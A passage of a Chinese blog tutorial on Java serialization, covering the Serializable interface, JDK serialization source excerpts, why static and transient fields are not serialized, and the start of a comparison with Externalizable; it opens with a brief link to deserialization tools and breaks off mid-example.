application&#x2F;xml）json(jackson,fastjson)http请求中包含</p><p>利用工具：<a href="https://github.com/frohoff/ysoserial%EF%BC%8C%E5%88%A9%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Chttps://github.com/NickstaDB/SerializationDumper">https://github.com/frohoff/ysoserial，利用原生类的反序列化，https://github.com/NickstaDB/SerializationDumper</a> 还原Java的序列化数据</p><h2 id="序列化接口-Serializable"><a href="#序列化接口-Serializable" class="headerlink" title="序列化接口 Serializable"></a>序列化接口 Serializable</h2><p>Java 序列化是 JDK 1.1 时引入的一组开创性的特性，用于将 Java 对象转换为字节数组，便于存储或传输。此后，仍然可以将字节数组转换回 Java 对象原有的状态。</p><p>序列化的思想是“冻结”对象状态，然后写到磁盘或者在网络中传输；<a href="https://javabetter.cn/io/serialize.html">反序列化</a>的思想是“解冻”对象状态，重新获得可用的 Java 对象。</p><p>序列化有一条规则，就是要序列化的对象必须实现 <code>Serializbale</code> 接口，否则就会报 NotSerializableException 异常。</p><p>好，来看看 <code>Serializbale</code> 接口的定义吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没别的了！</p><p>明明就一个空的接口嘛，竟然能够保证实现了它的“类对象”被序列化和反序列化？</p><h3 id="02、再来点实战"><a href="#02、再来点实战" class="headerlink" title="02、再来点实战"></a>02、再来点实战</h3><p>在回答上述问题之前，我们先来创建一个类（只有两个字段，和对应的 <code>getter/setter</code>），用于序列化和反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来创建一个测试类，通过 <code>ObjectOutputStream</code> 将“18 岁的王二”写入到文件当中，实际上就是一种序列化的过程；再通过 <code>ObjectInputStream</code> 将“18 岁的王二”从文件中读出来，实际上就是一种反序列化的过程。（前面我们学习<a href="https://javabetter.cn/io/serialize.html">序列流</a>的时候也讲过）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;王二&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把对象写到文件中</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));)&#123;</span><br><span class="line">    oos.writeObject(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件中读出对象</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));)&#123;</span><br><span class="line">    <span class="type">Wanger</span> <span class="variable">wanger1</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">    System.out.println(wanger1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过，由于 <code>Wanger</code> 没有实现 <code>Serializbale</code> 接口，所以在运行测试类的时候会抛出异常，堆栈信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.NotSerializableException: com.cmower.java_demo.xuliehua.Wanger</span><br><span class="line">at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)</span><br><span class="line">at com.cmower.java_demo.xuliehua.Test.main(Test.java:21)</span><br></pre></td></tr></table></figure><p>顺着堆栈信息，我们来看一下 <code>ObjectOutputStream</code> 的 <code>writeObject0()</code> 方法。其部分源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断对象是否为字符串类型，如果是，则调用 writeString 方法进行序列化</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    writeString((String) obj, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断对象是否为数组类型，如果是，则调用 writeArray 方法进行序列化</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">    writeArray(obj, desc, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断对象是否为枚举类型，如果是，则调用 writeEnum 方法进行序列化</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">    writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断对象是否为可序列化类型，如果是，则调用 writeOrdinaryObject 方法进行序列化</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">    writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果对象不能被序列化，则抛出 NotSerializableException 异常</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">        cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，<code>ObjectOutputStream</code> 在序列化的时候，会判断被序列化的对象是哪一种类型，字符串？数组？枚举？还是 <code>Serializable</code>，如果全都不是的话，抛出 <code>NotSerializableException</code>。<br>假如 <code>Wanger</code> 实现了 <code>Serializable</code> 接口，就可以序列化和反序列化了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体怎么序列化呢？</p><p>以 <code>ObjectOutputStream</code> 为例吧，它在序列化的时候会依次调用 <code>writeObject()</code>→<code>writeObject0()</code>→<code>writeOrdinaryObject()</code>→<code>writeSerialData()</code>→<code>invokeWriteObject()</code>→<code>defaultWriteFields()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取对象的类，并检查是否可以进行默认的序列化</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取对象的基本类型字段的数量，以及这些字段的值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">// 将基本类型字段的值写入输出流</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取对象的非基本类型字段的值</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line">    <span class="comment">// 循环写入对象的非基本类型字段的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 调用 writeObject0 方法将对象的非基本类型字段序列化写入输出流</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObject0(objVals[i], fields[numPrimFields + i].isUnshared());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果在写入过程中出现异常，则将异常包装成 IOException 抛出</span></span><br><span class="line">        <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (abortIOException == <span class="literal">null</span>) &#123;</span><br><span class="line">                abortIOException = ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那怎么反序列化呢？</p><p>以 <code>ObjectInputStream</code> 为例，它在反序列化的时候会依次调用 <code>readObject()</code>→<code>readObject0()</code>→<code>readOrdinaryObject()</code>→<code>readSerialData()</code>→<code>defaultReadFields()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取对象的类，并检查对象是否属于该类</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取对象的基本类型字段的数量和值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从输入流中读取基本类型字段的值，并存储在 primVals 数组中</span></span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 将 primVals 数组中的基本类型字段的值设置到对象的相应字段中</span></span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取对象的非基本类型字段的数量和值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">objHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    <span class="comment">// 循环读取对象的非基本类型字段的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 调用 readObject0 方法读取对象的非基本类型字段的值</span></span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(Object.class, f.isUnshared());</span><br><span class="line">        <span class="comment">// 如果该字段是一个引用字段，则将其标记为依赖该对象</span></span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 将 objVals 数组中的非基本类型字段的值设置到对象的相应字段中</span></span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Serializable</code> 接口之所以定义为空，是因为它只起到了一个标识的作用，告诉程序实现了它的对象是可以被序列化的，但真正序列化和反序列化的操作并不需要它来完成。</p><h3 id="03、再来点注意事项"><a href="#03、再来点注意事项" class="headerlink" title="03、再来点注意事项"></a>03、再来点注意事项</h3><p>开门见山的说吧，<a href="https://javabetter.cn/oo/static.html"><code>static</code></a> 和 <a href="https://javabetter.cn/io/transient.html"><code>transient</code></a> 修饰的字段是不会被序列化的。<br>为什么呢？我们先来证明，再来解释原因。<br>首先，在 <code>Wanger</code> 类中增加两个字段。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="string">&quot;沉默&quot;</span>;</span><br><span class="line">    <span class="keyword">transient</span> <span class="type">String</span> <span class="variable">meizi</span> <span class="operator">=</span> <span class="string">&quot;王三&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wanger&#123;&quot;</span> + <span class="string">&quot;name=&quot;</span> + name + <span class="string">&quot;,age=&quot;</span> + age + <span class="string">&quot;,pre=&quot;</span> + pre + <span class="string">&quot;,meizi=&quot;</span> + meizi + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次，在测试类中打印序列化前和反序列化后的对象，并在序列化后和反序列化前改变 <code>static</code> 字段的值。具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;王二&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把对象写到文件中</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));)&#123;</span><br><span class="line">        oos.writeObject(wanger);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 改变 static 字段的值</span></span><br><span class="line">Wanger.pre =<span class="string">&quot;不沉默&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件中读出对象</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));)&#123;</span><br><span class="line">    <span class="type">Wanger</span> <span class="variable">wanger1</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">    System.out.println(wanger1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wanger&#123;name=王二,age=18,pre=沉默,meizi=王三&#125;</span><br><span class="line">Wanger&#123;name=王二,age=18,pre=不沉默,meizi=null&#125;</span><br></pre></td></tr></table></figure><p>从结果的对比当中，我们可以发现：</p><p>1）序列化前，<code>pre</code> 的值为“沉默”，序列化后，<code>pre</code> 的值修改为“不沉默”，反序列化后，<code>pre</code> 的值为“不沉默”，而不是序列化前的状态“沉默”。<br>为什么呢？因为序列化保存的是对象的状态，而 <code>static</code> 修饰的字段属于类的状态，因此可以证明序列化并不保存 <code>static</code> 修饰的字段。</p><p>2）序列化前，<code>meizi</code> 的值为“王三”，反序列化后，<code>meizi</code> 的值为 <code>null</code>，而不是序列化前的状态“王三”。<br>为什么呢？<code>transient</code> 的中文字义为“临时的”（论英语的重要性），它可以阻止字段被序列化到文件中，在被反序列化后，<code>transient</code> 字段的值被设为初始值，比如 <code>int</code> 型的初始值为 0，对象型的初始值为 <code>null</code>。</p><p>如果想要深究源码的话，你可以在 <code>ObjectStreamClass</code> 中发现下面这样的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectStreamField[] getDefaultSerialFields(Class&lt;?&gt; cl) &#123;</span><br><span class="line">    <span class="comment">// 获取该类中声明的所有字段</span></span><br><span class="line">    Field[] clFields = cl.getDeclaredFields();</span><br><span class="line">    ArrayList&lt;ObjectStreamField&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Modifier.STATIC | Modifier.TRANSIENT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有字段，将非 static 和 transient 的字段添加到 list 中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; clFields.length; i++) &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clFields[i];</span><br><span class="line">        <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> field.getModifiers();</span><br><span class="line">        <span class="keyword">if</span> ((mods &amp; mask) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 根据字段名、字段类型和字段是否可序列化创建一个 ObjectStreamField 对象</span></span><br><span class="line">            <span class="type">ObjectStreamField</span> <span class="variable">osf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(field.getName(), field.getType(), !Serializable.class.isAssignableFrom(cl));</span><br><span class="line">            list.add(osf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> list.size();</span><br><span class="line">    <span class="comment">// 如果 list 为空，则返回一个空的 ObjectStreamField 数组，否则将 list 转换为 ObjectStreamField 数组并返回</span></span><br><span class="line">    <span class="keyword">return</span> (size == <span class="number">0</span>) ? NO_FIELDS :</span><br><span class="line">        list.toArray(<span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>[size]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到 <code>Modifier.STATIC | Modifier.TRANSIENT</code> 了吧，这两个修饰符标记的字段就没有被放入到序列化的字段中，明白了吧？</p><p>那么为什么 static 变量不会被序列化呢，基于什么原因？<br>static 变量属于类级别的变量，而不是实例级别的。这意味着 static 变量是与类相关联的，而不是与类的某个特定实例相关联。所有实例共享同一 static 变量的单一副本。因此，在序列化过程中，序列化机制只关注对象的实例状态，而不是类的状态。<br>序列化的主要目的是保存对象的状态，以便可以在稍后的时间点或在不同的 JVM 环境中重构对象。static 变量的值是独立于对象实例的，并且它的生命周期跨越单个实例。如果序列化 static 变量，那么每次反序列化时都可能覆盖正在运行的程序的当前状态，这可能导致不可预见的行为。<br>如果 static 变量被包含在序列化中，每个反序列化的对象都可能尝试修改这一 static 变量，这将违反 static 变量的设计初衷——提供一个全局访问点且状态一致的变量。这种设计可以确保在类的所有实例之间共享同一个数据。</p><p>transient 关键字用于修饰类的成员变量，在序列化对象时，被修饰的成员变量不会被序列化和保存到文件中。其作用是告诉 JVM 在序列化对象时不需要将该变量的值持久化，这样可以避免一些安全或者性能问题。但是，transient 修饰的成员变量在反序列化时会被初始化为其默认值（如 int 类型会被初始化为 0，引用类型会被初始化为 null），因此需要在程序中进行适当的处理。</p><p>transient 关键字和 static 关键字都可以用来修饰类的成员变量。其中，transient 关键字表示该成员变量不参与序列化和反序列化，而 static 关键字表示该成员变量是属于类的，不属于对象的，因此不需要序列化和反序列化。</p><p>在 Serializable 和 Externalizable 接口中，transient 关键字的表现也不同，在 Serializable 中表示该成员变量不参与序列化和反序列化，在 Externalizable 中不起作用，因为 Externalizable 接口需要实现 readExternal 和 writeExternal 方法，需要手动完成序列化和反序列化的过程。</p><h3 id="04、再来点干货"><a href="#04、再来点干货" class="headerlink" title="04、再来点干货"></a>04、再来点干货</h3><p>除了 <code>Serializable</code> 之外，Java 还提供了一个序列化接口 <code>Externalizable</code>（念起来有点拗口）。</p><p>两个接口有什么不一样的吗？试一试就知道了。</p><p>首先，把 <code>Wanger</code> 类实现的接口  <code>Serializable</code> 替换为 <code>Externalizable</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 